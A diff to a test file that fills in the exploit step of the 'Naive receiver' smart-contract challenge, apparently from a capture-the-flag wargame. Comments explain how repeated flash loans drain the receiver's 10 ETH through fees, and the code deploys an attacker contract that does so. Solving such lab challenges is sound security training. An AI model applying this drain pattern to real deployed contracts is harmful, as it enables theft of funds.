@@ -30,7 +30,14 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        //Receiver starts with 10 eth but pays 1 eth fee after a flashLoan transaction. 
+        //Asking for 10 flashloans means its balance get drained and sent to the pool. 
+        //We can call 10 times that function or make a contract that loops ten times that flashloan call inside another function call.
+        const attackerFactory = await ethers.getContractFactory("NaiveReceiverAttacker");
+        const attackerContract = await attackerFactory.deploy(this.pool.address);
+        await attackerContract.connect(attacker).drainReceiver(this.receiver.address, ethers.utils.parseEther('1'))
+        console.log("Current flashLoanReceiver balance: ", (await ethers.provider.getBalance(this.receiver.address)).toString())   
+        console.log("Current pool balance: ", (await ethers.provider.getBalance(this.pool.address)).toString())   
     });
 
     after(async function () {
